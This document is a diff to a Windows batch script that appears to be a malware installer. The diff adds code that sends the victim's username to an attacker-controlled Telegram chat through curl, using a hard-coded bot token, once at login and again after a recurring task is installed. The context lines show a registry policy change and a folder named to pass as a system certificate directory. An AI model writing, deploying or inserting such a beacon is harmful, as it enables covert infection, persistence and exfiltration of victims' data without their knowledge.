@@ -17,6 +17,32 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "Con
 
 
 
+:: SEND MSG
+
+:: Fucker CHAT ID : -1002163721260
+:: Output CHAT ID : -1002460905948
+
+
+:: Set bot token, chat ID, and message
+set "TOKEN=7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA"
+set "CHAT_ID=-1002163721260"
+set "MESSAGEEVERY=%USERNAME%LoggedIn....."
+
+
+:: URL encode the message by replacing spaces with %20
+set "ENCODED_MESSAGE=%MESSAGEEVERY: =%%2"
+
+:: Send the message using curl
+curl -s -X POST "https://api.telegram.org/bot%TOKEN%/sendMessage" ^
+     -d "chat_id=%CHAT_ID%" ^
+     -d "text=%ENCODED_MESSAGE%"
+
+echo Message sent to chat ID %CHAT_ID%
+
+
+
+
+
 :CHECKRUNEVERY
 
 mkdir "%APPDATA%\Microsoft\Windows\SystemCertificatesData\Tasks"
@@ -65,7 +91,7 @@ goto NEXT
 
 :INSTRUNEVERY
 
-
+:: RunEvery Files or Task missing 
 
 
 
@@ -124,7 +150,12 @@ timeout /t 1 /nobreak >nul
 
 
 
+set "MESSAGEEVERY=%USERNAME%|RUNEVERYINSTALLED...."
+set "ENCODED_MESSAGE=%MESSAGEEVERY: =%%2"
 
+curl -s -X POST "https://api.telegram.org/bot%TOKEN%/sendMessage" ^
+     -d "chat_id=%CHAT_ID%" ^
+     -d "text=%ENCODED_MESSAGE%"
 
 
 
